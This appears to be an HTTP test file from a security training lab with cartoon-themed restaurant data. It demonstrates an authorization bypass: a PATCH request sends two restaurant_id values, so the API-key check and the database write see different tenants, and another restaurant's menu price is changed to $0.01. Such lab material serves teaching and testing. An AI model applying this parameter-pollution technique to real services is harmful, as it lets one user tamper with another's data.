# @import ../common/setup.http
@host = {{base_host}}/v405

# EXPLOIT: Plankton edits a Krusty Krab menu item by providing two restaurant_ids.
# The first pop() is validated against his API key (restaurant_id=2 passes),
# the second pop() (restaurant_id=1) is used in the service layer - targeting Krusty Krab!

### Setup: Reset DB
{{
  await resetDB("v405");
}}

### Get menu items
GET /menu

{{
  exports.krabby_patty = response.parsedBody.find(i => i.name == "Krabby Patty");
  console.info("Target: Krabby Patty (id=" + exports.krabby_patty.id + "), price=$" + exports.krabby_patty.price);
}}


# --- Verify initial state ---

### Verify Krabby Patty belongs to Krusty Krab
GET /menu/{{krabby_patty.id}}

?? body restaurant_id == 1


# --- EXPLOIT: Plankton uses two restaurant_ids to bypass authorization ---

### EXPLOIT: Plankton edits Krusty Krab menu item with dual restaurant_ids
# First pop (2) matches his Chum Bucket API key - authorization passes!
# Second pop (1) is used in repository layer - targets Krusty Krab's item!
PATCH /menu/{{krabby_patty.id}}
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/json

{
  "restaurant_id": [2, 1],
  "price": 0.01
}

?? status == 200
?? body price == 0.01


### Verify: Krabby Patty price was changed
GET /menu/{{krabby_patty.id}}

?? body price == 0.01
?? body restaurant_id == 1

{{
  console.info("Krabby Patty now costs $0.01 - Mr. Krabs is losing money!");
}}
